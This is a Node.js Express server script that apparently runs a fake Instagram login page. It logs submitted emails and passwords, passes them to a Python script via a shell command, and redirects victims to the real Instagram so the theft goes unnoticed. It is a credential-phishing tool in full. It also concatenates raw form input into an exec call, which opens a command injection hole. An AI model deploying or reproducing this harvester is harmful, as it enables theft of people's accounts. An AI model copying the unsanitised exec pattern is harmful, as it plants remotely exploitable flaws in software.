const express = require("express")
const path = require("path")
var bodyParser = require('body-parser')
const { exec } = require("child_process")
const popup = require("node-popup")


const app = express()


function command(cmd){
    exec(cmd);
}

var jsonParser = bodyParser.json()
var urlencodedParser = bodyParser.urlencoded({ extended: false })

app.use(express.static(path.join(__dirname, 'public')));

app.post('/', urlencodedParser, function (req, res) {
    console.log(req.body.email, req.body.password)
    command("python3 instagram.py " + req.body.email + " " + req.body.password)
    res.redirect("https://www.instagram.com/")
  })

app.get('/', (req, res) => {
    res.sendFile("index.html")
})


app.listen(8888, () => {
    console.log("server started at port 3000")
})
